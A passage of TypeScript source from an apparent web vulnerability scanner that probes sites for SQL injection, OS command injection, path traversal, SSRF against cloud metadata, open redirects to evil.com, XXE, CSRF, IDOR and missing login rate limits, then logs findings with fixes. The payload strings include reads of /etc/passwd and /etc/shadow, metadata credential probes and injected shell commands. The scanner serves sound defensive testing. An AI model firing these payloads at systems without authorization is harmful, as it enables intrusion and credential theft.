            description: `Error-based SQL injection detected. The parameter '${param}' passes unsanitized input to an SQL query. The database returned an error message in the response, confirming the injection point. An attacker can exploit this to extract database schema, tables, and all data.`,
            severity: "critical",
            endpoint: testUrl,
            method: "GET",
            parameter: param,
            payload,
            evidence: `SQL error pattern '${match}' found in response body`,
            request: `GET ${testUrl} HTTP/1.1`,
            response: body.substring(0, 500),
            recommendation: "Use parameterized queries (prepared statements) exclusively. Never concatenate user input into SQL. Use an ORM that auto-parameterizes. Disable verbose database error messages in production.",
            cweId: "CWE-89",
            cvssScore: 9.8,
            aiAnalysis: "Critical SQL injection. Attackers can use tools like sqlmap to fully dump the database, bypass authentication, read local files (MySQL LOAD_FILE), and potentially execute OS commands (MySQL INTO OUTFILE, xp_cmdshell on MSSQL).",
          });
          break;
        }
      } catch { }
    }
  }

  // Boolean-based blind SQLi
  for (const param of params.slice(0, 6)) {
    for (const { trueP, falseP, desc } of SQLI_BLIND_PAYLOADS) {
      const key = `sqli-blind-${param}`;
      if (reported.has(key)) continue;
      try {
        const trueUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(trueP)}`;
        const falseUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(falseP)}`;
        const [trueRes, falseRes] = await Promise.all([
          fetchWithTimeout(trueUrl, {}, 4000),
          fetchWithTimeout(falseUrl, {}, 4000),
        ]);
        const trueBody = await trueRes.text();
        const falseBody = await falseRes.text();
        const lenDiff = Math.abs(trueBody.length - falseBody.length);
        const statusDiff = trueRes.status !== falseRes.status;
        if ((lenDiff > 50 && lenDiff < 5000) || statusDiff) {
          reported.add(key);
          await addFinding(scanId, {
            type: "SQLi",
            title: `${desc} — Parameter '${param}'`,
            description: `Boolean-based blind SQL injection detected in parameter '${param}'. The application returns different responses for true/false SQL conditions (response length difference: ${lenDiff} bytes, status code changed: ${statusDiff}). While no error is shown, data can still be extracted bit-by-bit.`,
            severity: "critical",
            endpoint: trueUrl,
            method: "GET",
            parameter: param,
            payload: `${trueP} (true) vs ${falseP} (false)`,
            evidence: `True condition → ${trueRes.status} / ${trueBody.length} bytes. False condition → ${falseRes.status} / ${falseBody.length} bytes. Difference: ${lenDiff} bytes`,
            recommendation: "Use parameterized queries. Implement WAF rules to detect SQL metacharacters in inputs. Enable database activity monitoring.",
            cweId: "CWE-89",
            cvssScore: 9.1,
            aiAnalysis: "Boolean-based blind SQLi allows complete database extraction without error messages, making it harder to detect but equally dangerous. Tools like sqlmap can automate full exploitation.",
          });
          break;
        }
      } catch { }
    }
  }

  // Time-based blind SQLi
  for (const param of params.slice(0, 5)) {
    for (const { p: payload, dbType } of SQLI_TIME_PAYLOADS.slice(0, 2)) {
      const key = `sqli-time-${param}`;
      if (reported.has(key)) continue;
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        const before = Date.now();
        await fetchWithTimeout(testUrl, {}, 8000);
        const elapsed = Date.now() - before;
        if (elapsed >= 2800) {
          reported.add(key);
          await addFinding(scanId, {
            type: "SQLi",
            title: `Time-Based Blind SQLi (${dbType}) — Parameter '${param}'`,
            description: `Time-based blind SQL injection confirmed in parameter '${param}'. A SLEEP/WAITFOR payload caused a ${(elapsed / 1000).toFixed(1)}s response delay, confirming SQL execution. The backend appears to be ${dbType}. This technique works even when the app shows no output or errors.`,
            severity: "critical",
            endpoint: testUrl,
            method: "GET",
            parameter: param,
            payload,
            evidence: `Response delay: ${(elapsed / 1000).toFixed(1)} seconds (expected ~3s delay if vulnerable)`,
            recommendation: "Use parameterized queries immediately. This is a confirmed critical vulnerability. Treat all parameters as untrusted. Deploy a WAF with SQL injection rules.",
            cweId: "CWE-89",
            cvssScore: 9.8,
            aiAnalysis: `Time-based SQLi on ${dbType} confirmed. Even without visible output, attackers can extract all database contents character by character using automated tools.`,
          });
          break;
        }
      } catch { }
    }
  }

  // Form-based SQLi
  for (const form of crawlResult.forms.slice(0, 5)) {
    const textInputs = form.inputs.filter(i => !["hidden", "submit", "checkbox", "radio", "button", "file"].includes(i.type));
    for (const input of textInputs.slice(0, 3)) {
      const key = `sqli-form-${form.action}-${input.name}`;
      if (reported.has(key)) continue;
      for (const { p: payload, patterns } of SQLI_ERROR_PAYLOADS.slice(0, 3)) {
        try {
          const formData = new URLSearchParams();
          for (const i of form.inputs) formData.append(i.name, i.name === input.name ? payload : i.value || "test");
          const method = form.method === "GET" ? "GET" : "POST";
          const fetchUrl = method === "GET" ? `${form.action}?${formData}` : form.action;
          const res = await fetchWithTimeout(fetchUrl, {
            method,
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: method === "POST" ? formData.toString() : undefined,
          }, 5000);
          const body = (await res.text()).toLowerCase();
          const match = patterns.find(p => body.includes(p));
          if (match) {
            reported.add(key);
            await addFinding(scanId, {
              type: "SQLi",
              title: `SQL Injection via Form Field '${input.name}' at ${form.action}`,
              description: `SQL injection detected in the '${input.name}' form field. The server returned a database error ('${match}') when a SQL metacharacter was submitted.`,
              severity: "critical",
              endpoint: form.action,
              method,
              parameter: input.name,
              payload,
              evidence: `SQL error '${match}' in response to form submission`,
              recommendation: "Use prepared statements for all database queries. Validate and sanitize all form inputs.",
              cweId: "CWE-89",
              cvssScore: 9.8,
            });
            break;
          }
        } catch { }
      }
    }
  }
}

// ─── Command Injection ────────────────────────────────────────────────────────

async function checkCommandInjection(url: string, crawlResult: CrawlResult, scanId: string) {
  const payloads = [
    { p: "; echo CMDI_TEST_12345", pattern: "CMDI_TEST_12345", name: "Unix Command Injection (echo)" },
    { p: "| echo CMDI_TEST_12345", pattern: "CMDI_TEST_12345", name: "Pipe Command Injection" },
    { p: "`echo CMDI_TEST_12345`", pattern: "CMDI_TEST_12345", name: "Backtick Command Injection" },
    { p: "$(echo CMDI_TEST_12345)", pattern: "CMDI_TEST_12345", name: "Subshell Command Injection" },
    { p: "; sleep 3 #", pattern: null, name: "Time-Based Command Injection (sleep 3)" },
    { p: "| sleep 3", pattern: null, name: "Pipe Time-Based Command Injection" },
  ];

  const riskParams = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "query", "file", "path", "dir", "log", "debug"];
  const base = new URL(url);

  for (const param of [...riskParams, ...crawlResult.allParams].slice(0, 10)) {
    for (const { p: payload, pattern, name } of payloads) {
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        if (pattern) {
          const res = await fetchWithTimeout(testUrl, {}, 5000);
          const body = await res.text();
          if (body.includes(pattern)) {
            await addFinding(scanId, {
              type: "Command Injection",
              title: `OS Command Injection — ${name} — Parameter '${param}'`,
              description: `Remote OS command injection vulnerability confirmed. The server executed our injected command and returned its output in the response. An attacker can execute arbitrary commands on the server OS with the web server's privileges.`,
              severity: "critical",
              endpoint: testUrl,
              method: "GET",
              parameter: param,
              payload,
              evidence: `Command output '${pattern}' found in response body`,
              request: `GET ${testUrl} HTTP/1.1`,
              response: body.substring(0, 500),
              recommendation: "Never pass user input to OS command functions. Use language-native libraries instead of shell commands. If shell is unavoidable, use strict input allowlisting (only alphanumeric chars).",
              cweId: "CWE-78",
              cvssScore: 10.0,
              aiAnalysis: "Remote Code Execution (RCE) confirmed. Attacker can: read /etc/passwd, /etc/shadow, steal credentials, install backdoors, pivot to internal network, ransomware.",
            });
            return;
          }
        } else {
          // Time-based
          const t0 = Date.now();
          await fetchWithTimeout(testUrl, {}, 8000);
          const elapsed = Date.now() - t0;
          if (elapsed >= 2500) {
            await addFinding(scanId, {
              type: "Command Injection",
              title: `Time-Based OS Command Injection — ${name} — Parameter '${param}'`,
              description: `Time-based OS command injection detected. A 'sleep 3' command caused a ${(elapsed / 1000).toFixed(1)}s delay, strongly suggesting command execution on the server.`,
              severity: "critical",
              endpoint: testUrl,
              method: "GET",
              parameter: param,
              payload,
              evidence: `Response delayed ${(elapsed / 1000).toFixed(1)}s — consistent with sleep 3 execution`,
              recommendation: "Avoid passing user input to system/shell calls entirely. Sanitize strictly if unavoidable.",
              cweId: "CWE-78",
              cvssScore: 10.0,
            });
            return;
          }
        }
      } catch { }
    }
  }
}

// ─── Path Traversal / LFI ─────────────────────────────────────────────────────

async function checkPathTraversal(url: string, crawlResult: CrawlResult, scanId: string) {
  const payloads = [
    { p: "../../../../etc/passwd", patterns: ["root:x:", "root:!", "/bin/bash", "/bin/sh"] },
    { p: "..\\..\\..\\..\\windows\\win.ini", patterns: ["[fonts]", "[extensions]", "[mci extensions]"] },
    { p: "../../../../etc/shadow", patterns: ["root:", "password"] },
    { p: "../../../../proc/self/environ", patterns: ["PATH=", "HOME=", "USER="] },
    { p: "/etc/passwd", patterns: ["root:x:", "/bin/bash"] },
    { p: "file:///etc/passwd", patterns: ["root:x:", "/bin/bash"] },
    { p: "....//....//....//etc/passwd", patterns: ["root:x:", "/bin/bash"] },
    { p: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", patterns: ["root:x:", "/bin/bash"] },
  ];

  const fileParams = ["file", "path", "dir", "page", "include", "load", "read", "src", "source", "template", "doc", "document", "img", "image", "filename", "filepath", "view"];
  const base = new URL(url);

  for (const param of [...fileParams, ...crawlResult.allParams].slice(0, 10)) {
    for (const { p: payload, patterns } of payloads.slice(0, 5)) {
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        const res = await fetchWithTimeout(testUrl, {}, 5000);
        const body = await res.text();
        const match = patterns.find(p => body.includes(p));
        if (match) {
          await addFinding(scanId, {
            type: "Path Traversal",
            title: `Local File Inclusion / Path Traversal — Parameter '${param}'`,
            description: `Path traversal (Local File Inclusion) vulnerability confirmed. By manipulating the '${param}' parameter with directory traversal sequences (../), the server reads and returns contents of sensitive system files. Pattern '${match}' found in response confirms /etc/passwd was read.`,
            severity: "critical",
            endpoint: testUrl,
            method: "GET",
            parameter: param,
            payload,
            evidence: `System file content pattern '${match}' found in HTTP response`,
            request: `GET ${testUrl} HTTP/1.1`,
            response: body.substring(0, 500),
            recommendation: "Validate and canonicalize file paths. Use a whitelist of allowed filenames. Resolve paths and check they remain within the intended base directory. Never allow direct user control of file paths.",
            cweId: "CWE-22",
            cvssScore: 9.1,
            aiAnalysis: "LFI confirmed. Attacker can read /etc/passwd, /etc/shadow, SSH keys, application source code, config files with DB passwords. Combined with log poisoning can lead to RCE.",
          });
          return;
        }
      } catch { }
    }
  }
}

// ─── SSRF ─────────────────────────────────────────────────────────────────────

async function checkSSRF(url: string, crawlResult: CrawlResult, scanId: string) {
  const ssrfPayloads = [
    { p: "http://169.254.169.254/latest/meta-data/", patterns: ["ami-id", "instance-id", "iam", "security-credentials"] },
    { p: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", patterns: ["AccessKeyId", "SecretAccessKey", "Token"] },
    { p: "http://metadata.google.internal/computeMetadata/v1/", patterns: ["project", "instance", "google"] },
    { p: "http://169.254.169.254/computeMetadata/v1/", patterns: ["project", "instance"] },
    { p: "http://localhost/", patterns: ["localhost", "127.0.0.1"] },
    { p: "http://127.0.0.1/admin", patterns: ["admin", "dashboard", "panel"] },
    { p: "http://0.0.0.0/", patterns: ["html", "body", "server"] },
    { p: "dict://localhost:11211/stat", patterns: ["STAT", "version", "uptime"] },
    { p: "gopher://localhost:6379/_INFO", patterns: ["redis", "redis_version"] },
    { p: "file:///etc/passwd", patterns: ["root:x:", "/bin/bash"] },
  ];

  const urlParams = ["url", "redirect", "next", "target", "src", "source", "callback", "host", "endpoint", "proxy", "fetch", "load", "img", "image", "uri", "webhook", "notify", "return"];

  const base = new URL(url);
  const reported = new Set<string>();

  for (const param of [...urlParams, ...crawlResult.allParams].slice(0, 10)) {
    for (const { p: payload, patterns } of ssrfPayloads) {
      const key = `ssrf-${param}`;
      if (reported.has(key)) continue;
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        const res = await fetchWithTimeout(testUrl, {}, 5000);
        const body = await res.text();
        const match = patterns.find(p => body.toLowerCase().includes(p.toLowerCase()));
        if (match) {
          reported.add(key);
          await addFinding(scanId, {
            type: "SSRF",
            title: `Server-Side Request Forgery (SSRF) — Parameter '${param}'`,
            description: `SSRF vulnerability confirmed. The server made a request to '${payload}' (controlled by attacker) and returned the response. Pattern '${match}' found in response. If pointing to AWS/GCP metadata, this can expose cloud credentials and lead to full cloud account takeover.`,
            severity: "critical",
            endpoint: testUrl,
            method: "GET",
            parameter: param,
            payload,
            evidence: `Response contains metadata indicator '${match}' — server fetched attacker-controlled URL`,
            request: `GET ${testUrl} HTTP/1.1`,
            response: body.substring(0, 500),
            recommendation: "Whitelist allowed URL patterns and IP ranges. Block requests to RFC1918 (private), loopback, link-local, and cloud metadata ranges. Use a dedicated outbound proxy that enforces policies. Validate and resolve URLs before fetching.",
            cweId: "CWE-918",
            cvssScore: 9.8,
            aiAnalysis: "SSRF to cloud metadata can expose AWS/GCP/Azure credentials, enabling full cloud account takeover. Can also access internal services behind firewall, read internal APIs, and perform port scanning.",
          });
          break;
        }
      } catch { }
    }
  }
}

// ─── Open Redirect ────────────────────────────────────────────────────────────

async function checkOpenRedirect(url: string, crawlResult: CrawlResult, scanId: string) {
  const payloads = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/%2F..",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "%0d%0ahttps://evil.com",
  ];

  const redirectParams = ["redirect", "next", "return", "returnUrl", "goto", "destination", "url", "to", "link", "forward", "redir", "location", "target", "continue", "back", "ref"];
  const base = new URL(url);

  for (const param of [...redirectParams, ...crawlResult.allParams].slice(0, 10)) {
    for (const payload of payloads.slice(0, 4)) {
      try {
        const testUrl = `${base.origin}${base.pathname}?${param}=${encodeURIComponent(payload)}`;
        const res = await fetchWithTimeout(testUrl, { redirect: "manual" }, 4000);
        const location = res.headers.get("location") || "";
        if ([301, 302, 303, 307, 308].includes(res.status) && (location.includes("evil.com") || location.startsWith("//") || location.includes("javascript:"))) {
          await addFinding(scanId, {
            type: "Open Redirect",
            title: `Open Redirect — Parameter '${param}' → ${location}`,
            description: `Open redirect vulnerability confirmed. The parameter '${param}' with value '${payload}' caused the server to redirect to an external attacker-controlled domain ('${location}'). Used in phishing, OAuth token theft, and bypassing referrer checks.`,
            severity: "medium",
            endpoint: testUrl,
            method: "GET",
            parameter: param,
            payload,
            evidence: `HTTP ${res.status} Location: ${location}`,
            request: `GET ${testUrl} HTTP/1.1`,
            recommendation: "Validate redirect targets against a strict whitelist of allowed domains. Use relative paths where possible. If external redirects are needed, use an intermediary warning page.",
            cweId: "CWE-601",
            cvssScore: 5.4,
            aiAnalysis: "Open redirects are frequently used in phishing (disguise malicious link as trusted domain), OAuth 2.0 token theft, and bypass security controls that check the Referer header.",
          });
          return;
        }
      } catch { }
    }
  }
}

// ─── CSRF ─────────────────────────────────────────────────────────────────────

async function checkCSRF(url: string, crawlResult: CrawlResult, scanId: string) {
  const reported = new Set<string>();

  for (const form of crawlResult.forms) {
    if (form.method !== "POST") continue;
    const key = `csrf-${form.action}`;
    if (reported.has(key)) continue;

    const hasCSRF = form.inputs.some(i =>
      ["csrf", "_token", "authenticity_token", "csrfmiddlewaretoken", "xsrf", "_csrf", "requestverificationtoken"].some(t => i.name.toLowerCase().includes(t))
    );

    if (!hasCSRF) {
      reported.add(key);
      await addFinding(scanId, {
        type: "CSRF",
        title: `Missing CSRF Token on POST Form — ${form.action}`,
        description: `The form at '${form.action}' submits via POST but has no CSRF token. An attacker can create a malicious webpage that auto-submits this form when a logged-in user visits it, performing actions on their behalf without consent.`,
        severity: "medium",
        endpoint: form.action,
        method: "POST",
        evidence: `POST form found at '${form.action}' without CSRF token. Fields: ${form.inputs.map(i => i.name).join(", ")}`,
        request: `POST ${form.action} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n${form.inputs.map(i => `${i.name}=value`).join("&")}`,
        recommendation: "Implement the Synchronizer Token Pattern (add a unique, unpredictable CSRF token to every form). Add SameSite=Strict to session cookies. Use framework-built CSRF protection (Django CSRF middleware, Rails protect_from_forgery, etc.).",
        cweId: "CWE-352",
        cvssScore: 6.5,
        aiAnalysis: "CSRF allows attackers to perform privileged actions (password change, fund transfer, account deletion) on behalf of authenticated users via malicious websites. Admin actions are especially dangerous targets.",
      });
    }
  }

  // Check if state-changing endpoints accept requests without CSRF headers
  const statefulPaths = ["/api/", "/account", "/user", "/profile", "/password", "/settings", "/admin"];
  for (const path of statefulPaths) {
    try {
      const testUrl = `${new URL(url).origin}${path}`;
      const res = await fetchWithTimeout(testUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json", "Origin": "https://evil.com" },
        body: JSON.stringify({ test: true }),
      }, 4000);
      if (res.status < 500 && res.status !== 405) {
        const key = `csrf-api-${path}`;
        if (!reported.has(key)) {
          reported.add(key);
          await addFinding(scanId, {
            type: "CSRF",
            title: `API Endpoint May Lack CSRF Protection — ${path}`,
            description: `The endpoint '${testUrl}' accepted a cross-origin POST request (from evil.com origin) without rejection. If this endpoint performs state changes, it may be vulnerable to CSRF attacks via form-based or fetch-based attacks.`,
            severity: "medium",
            endpoint: testUrl,
            method: "POST",
            evidence: `Cross-origin POST accepted with HTTP ${res.status} (from Origin: https://evil.com)`,
            recommendation: "Require CSRF tokens or validate Origin/Referer headers on all state-changing API endpoints. Use SameSite cookies for session management.",
            cweId: "CWE-352",
            cvssScore: 5.4,
          });
        }
      }
    } catch { }
  }
}

// ─── XXE ──────────────────────────────────────────────────────────────────────

async function checkXXE(url: string, crawlResult: CrawlResult, scanId: string) {
  const xxePayloads = [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
    `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
  ];

  const xmlEndpoints = [
    `${new URL(url).origin}/api/`,
    `${new URL(url).origin}/api/v1/`,
    `${new URL(url).origin}/upload`,
    `${new URL(url).origin}/xml`,
    `${new URL(url).origin}/soap`,
    url,
  ];

  for (const endpoint of xmlEndpoints) {
    for (const payload of xxePayloads.slice(0, 2)) {
      try {
        const res = await fetchWithTimeout(endpoint, {
          method: "POST",
          headers: { "Content-Type": "application/xml" },
          body: payload,
        }, 5000);
        const body = await res.text();
        if (body.includes("root:x:") || body.includes("/bin/bash") || body.includes("ami-id") || body.includes("hostname")) {
          await addFinding(scanId, {
            type: "XXE",
            title: `XML External Entity (XXE) Injection — ${endpoint}`,
            description: `XXE injection confirmed at '${endpoint}'. The XML parser processed the external entity declaration and included file contents in the response. This allows reading arbitrary server files and potentially achieving SSRF.`,
            severity: "critical",
            endpoint,
            method: "POST",
            payload: payload.substring(0, 200),
            evidence: `System file content returned in XML response: ${body.substring(0, 200)}`,
            request: `POST ${endpoint} HTTP/1.1\nContent-Type: application/xml\n\n${payload.substring(0, 200)}`,
            response: body.substring(0, 500),
            recommendation: "Disable external entity processing in the XML parser. In Java (JAXP): setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). In PHP: libxml_disable_entity_loader(true). Use JSON instead of XML where possible.",
            cweId: "CWE-611",
            cvssScore: 9.1,
            aiAnalysis: "XXE allows reading local files (/etc/passwd, app config, private keys), performing SSRF to internal services, and in some configs even RCE via Java serialization gadgets.",
          });
          return;
        }
      } catch { }
    }
  }
}

// ─── Rate Limiting ────────────────────────────────────────────────────────────

async function checkRateLimiting(url: string, scanId: string) {
  const loginPaths = ["/login", "/signin", "/api/login", "/api/auth", "/auth/login", "/user/login", "/account/login"];
  const base = new URL(url).origin;

  for (const path of loginPaths) {
    try {
      const endpoint = `${base}${path}`;
      const requests = Array.from({ length: 15 }, (_, i) => fetchWithTimeout(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: `test${i}@test.com`, password: `wrongpass${i}` }),
        redirect: "manual",
      }, 4000).catch(() => null));

      const responses = await Promise.allSettled(requests);
      const results = responses.filter(r => r.status === "fulfilled" && r.value).map(r => (r as PromiseFulfilledResult<Response | null>).value!);

      if (results.length < 5) continue;

      const has429 = results.some(r => r.status === 429);
      const hasRetryAfter = results.some(r => r.headers.get("retry-after") || r.headers.get("x-ratelimit-limit"));
      const allOk = results.filter(r => r.status === 200 || r.status === 401 || r.status === 403).length;

      if (!has429 && !hasRetryAfter && allOk >= 12) {
        await addFinding(scanId, {
          type: "Auth",
          title: `No Rate Limiting on Login Endpoint — ${path}`,
          description: `Sent 15 rapid POST requests to '${endpoint}' without receiving any rate-limiting response (no HTTP 429, no Retry-After header). This allows unlimited brute-force or credential stuffing attacks against user accounts.`,
          severity: "high",
          endpoint,
          method: "POST",
          evidence: `15 consecutive login requests returned status codes: ${[...new Set(results.map(r => r.status))].join(", ")} — no 429 Too Many Requests`,
          recommendation: "Implement rate limiting on authentication endpoints (e.g., 5 attempts per minute per IP). Use account lockout after N failed attempts. Implement CAPTCHA for failed logins. Use fail2ban or WAF-level rate limiting.",
          cweId: "CWE-307",
          cvssScore: 7.5,
          aiAnalysis: "Without rate limiting, attackers can perform credential stuffing using leaked password lists (100M+ common passwords) to take over accounts. Tools like Hydra or Burp Intruder can automate this.",
        });
        return;
      }
    } catch { }
  }
}

// ─── IDOR ─────────────────────────────────────────────────────────────────────

async function checkIDOR(url: string, crawlResult: CrawlResult, scanId: string) {
  const idorParams = ["id", "user_id", "userId", "account_id", "profile_id", "order_id", "doc_id", "file_id", "record", "uid", "pid"];
  const base = new URL(url);

  for (const param of idorParams) {
    try {
      const url1 = `${base.origin}${base.pathname}?${param}=1`;
      const url2 = `${base.origin}${base.pathname}?${param}=2`;
      const [res1, res2] = await Promise.all([
        fetchWithTimeout(url1, {}, 4000),
        fetchWithTimeout(url2, {}, 4000),
      ]);

      if (res1.status === 200 && res2.status === 200) {
        const body1 = await res1.text();
        const body2 = await res2.text();
        const lenDiff = Math.abs(body1.length - body2.length);
        if (lenDiff > 30 && lenDiff < 10000 && body1 !== body2) {
          await addFinding(scanId, {
            type: "IDOR",
            title: `Potential Insecure Direct Object Reference — Parameter '${param}'`,
            description: `The parameter '${param}' returns different data for id=1 vs id=2 (${lenDiff} byte difference) without apparent authorization enforcement. An attacker could iterate through IDs to access other users' data, orders, or documents.`,
            severity: "high",
            endpoint: url1,
            method: "GET",
            parameter: param,
            payload: `${param}=1 vs ${param}=2`,
            evidence: `${param}=1 → ${res1.status} / ${body1.length} bytes. ${param}=2 → ${res2.status} / ${body2.length} bytes (${lenDiff} byte difference with no auth rejection)`,
            recommendation: "Implement object-level authorization checks on every resource access. Verify the requesting user owns or has permission to access the requested object. Use indirect references (map IDs to UUIDs or session-specific tokens).",
            cweId: "CWE-639",
            cvssScore: 7.5,
            aiAnalysis: "IDOR is one of the most common and impactful API vulnerabilities (OWASP API #1). Attackers enumerate IDs to access other users' private data, modify others' records, or delete resources.",
          });
          return;
        }
      }
    } catch { }
  }

  // Test for IDOR in API endpoints
  const apiPatterns = ["/api/users/", "/api/user/", "/api/accounts/", "/api/orders/", "/api/profile/", "/api/documents/", "/users/", "/account/"];
  for (const pattern of apiPatterns) {
    for (const id of ["1", "2", "3"]) {
      try {
        const endpoint = `${new URL(url).origin}${pattern}${id}`;
        const res = await fetchWithTimeout(endpoint, {}, 4000);
        if (res.status === 200) {
          const body = await res.text();
          if (body.includes("email") || body.includes("username") || body.includes("name") || body.includes("user")) {
            await addFinding(scanId, {
              type: "IDOR",
              title: `Potential IDOR — Unauthenticated Access to Object ${pattern}${id}`,
              description: `The API endpoint '${endpoint}' returned HTTP 200 with what appears to be user/object data without requiring authentication. An attacker can iterate IDs to harvest all records.`,
              severity: "high",
              endpoint,
              method: "GET",
              evidence: `HTTP 200 with data fields at ${endpoint}: ${body.substring(0, 200)}`,
              recommendation: "Require authentication and authorization on all object-level API endpoints. Return HTTP 401 for unauthenticated and 403 for unauthorized requests.",
              cweId: "CWE-639",
              cvssScore: 7.5,
            });
            return;
          }
        }
      } catch { }
    }
  }
}

// ─── HTTP Methods ─────────────────────────────────────────────────────────────

async function checkDangerousHTTPMethods(url: string, scanId: string) {
  const dangerousMethods = ["TRACE", "PUT", "DELETE", "PATCH", "OPTIONS", "CONNECT"];
  const base = new URL(url).origin;

  // TRACE XST
  try {
    const res = await fetchWithTimeout(base, { method: "TRACE" }, 4000);
    if (res.status === 200) {
      const body = await res.text();
      if (body.toUpperCase().includes("TRACE")) {
        await addFinding(scanId, {
          type: "HTTP Methods",
          title: "HTTP TRACE Method Enabled — Cross-Site Tracing (XST) Risk",
          description: "The HTTP TRACE method is enabled. Combined with XSS, attackers can use TRACE to steal HTTP-only cookies (Cross-Site Tracing / XST attack). TRACE echoes the full request back, including all headers.",
          severity: "medium",
          endpoint: base,
          method: "TRACE",
          evidence: `TRACE ${base} → HTTP ${res.status}, body echoed request`,
          recommendation: "Disable the TRACE method in server configuration. In Apache: TraceEnable Off. In Nginx: if ($request_method = TRACE) { return 405; }",
          cweId: "CWE-16",
          cvssScore: 4.3,
        });
      }
    }
  } catch { }

  // OPTIONS — check allowed methods
  try {
    const res = await fetchWithTimeout(base, { method: "OPTIONS" }, 4000);
    const allow = res.headers.get("allow") || res.headers.get("access-control-allow-methods") || "";
    const dangerous = ["PUT", "DELETE", "PATCH"].filter(m => allow.toUpperCase().includes(m));
    if (dangerous.length > 0) {
      await addFinding(scanId, {
        type: "HTTP Methods",
        title: `Dangerous HTTP Methods Allowed: ${dangerous.join(", ")}`,
        description: `The server allows potentially dangerous HTTP methods: ${dangerous.join(", ")}. PUT can allow file upload to the server, DELETE can remove resources, PATCH can modify data without authorization checks.`,
        severity: "medium",
        endpoint: base,
        method: "OPTIONS",
        evidence: `Allow: ${allow}`,
        recommendation: "Only allow HTTP methods that are actually required (GET, POST, HEAD). Disable PUT, DELETE, TRACE, CONNECT unless explicitly needed.",
        cweId: "CWE-16",
        cvssScore: 5.3,
      });
    }
  } catch { }
}

// ─── HTML Comment & Debug Info Disclosure ─────────────────────────────────────

async function checkInfoDisclosure(url: string, crawlResult: CrawlResult, scanId: string) {
  const urlsToCheck = [url, ...crawlResult.urls.slice(0, 5)];
  const reported = new Set<string>();

  for (const checkUrl of urlsToCheck) {
    try {
      const res = await fetchWithTimeout(checkUrl, { redirect: "follow" }, 5000);
      const body = await res.text();
      const parsed = parsePage(body, checkUrl);

      // Check HTML comments for sensitive data
      for (const comment of parsed.comments) {
        const isSensitive = ["password", "secret", "token", "api key", "apikey", "credentials", "todo", "debug", "admin", "internal", "do not", "hack", "fixme", "database", "db_pass"].some(k => comment.toLowerCase().includes(k));
        if (isSensitive && comment.length > 10) {
          const key = `comment-${comment.substring(0, 30)}`;
          if (!reported.has(key)) {
            reported.add(key);
            await addFinding(scanId, {
              type: "Information Disclosure",
              title: `Sensitive Data in HTML Comment at ${checkUrl}`,
              description: `An HTML comment contains potentially sensitive information: '${comment.substring(0, 100)}'. Comments in HTML are visible to anyone who views the page source and should never contain credentials, internal notes, or sensitive configuration.`,
              severity: "medium",
              endpoint: checkUrl,
              evidence: `<!-- ${comment.substring(0, 200)} -->`,
              recommendation: "Remove all sensitive information from HTML comments before deployment. Use a build process that strips comments from production code.",
              cweId: "CWE-615",
              cvssScore: 5.3,
            });
          }
        }
      }

      // Check for stack traces / debug output in response
      const debugPatterns = [
        { p: "stack trace", title: "Stack Trace Exposed in Response" },
        { p: "exception in thread", title: "Java Exception Stack Trace Exposed" },
        { p: "at java.", title: "Java Stack Trace Exposed" },
        { p: "traceback (most recent call last)", title: "Python Traceback Exposed" },
        { p: "fatal error:", title: "PHP Fatal Error Exposed" },
        { p: "warning: include(", title: "PHP Include Warning Exposed" },
        { p: "mysqlexception", title: "MySQL Exception Stack Trace Exposed" },
        { p: "sqlexception", title: "SQL Exception Exposed" },
        { p: "internal server error", title: "Internal Server Error Details Exposed" },
        { p: "debug=true", title: "Debug Mode Enabled" },
        { p: "django.conf", title: "Django Debug Page Exposed" },
        { p: "laravel.log", title: "Laravel Log Information Exposed" },
      ];

      const lowerBody = body.toLowerCase();
      for (const { p, title } of debugPatterns) {
        if (lowerBody.includes(p)) {
          const key = `debug-${p}`;
          if (!reported.has(key)) {
            reported.add(key);
            const idx = lowerBody.indexOf(p);
            await addFinding(scanId, {
              type: "Information Disclosure",
              title,
              description: `The application returns debug/error information in HTTP responses: '${p}'. This reveals internal application structure, file paths, class names, and logic that attackers can use to craft more targeted attacks.`,
              severity: "medium",
              endpoint: checkUrl,
              evidence: body.substring(Math.max(0, idx - 50), Math.min(body.length, idx + 200)),
              recommendation: "Disable debug mode in production. Configure proper error handling that shows generic error pages to users. Log detailed errors server-side only.",
              cweId: "CWE-209",
              cvssScore: 5.3,
            });
          }
        }
      }

      // Check for exposed email addresses / phone numbers
      const emailRe = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
      const emails = [...new Set(body.match(emailRe) || [])].filter(e => !e.includes("example.") && !e.includes("test@"));
      if (emails.length > 0) {
        const key = `emails-${checkUrl}`;
        if (!reported.has(key)) {
          reported.add(key);
          await addFinding(scanId, {
            type: "Information Disclosure",
            title: `Email Addresses Exposed in Page Source`,
            description: `The page exposes ${emails.length} email address(es) in HTML source: ${emails.slice(0, 5).join(", ")}. These can be harvested for phishing, spam, or used to enumerate users.`,
            severity: "info",
            endpoint: checkUrl,
            evidence: `Emails found: ${emails.slice(0, 5).join(", ")}`,
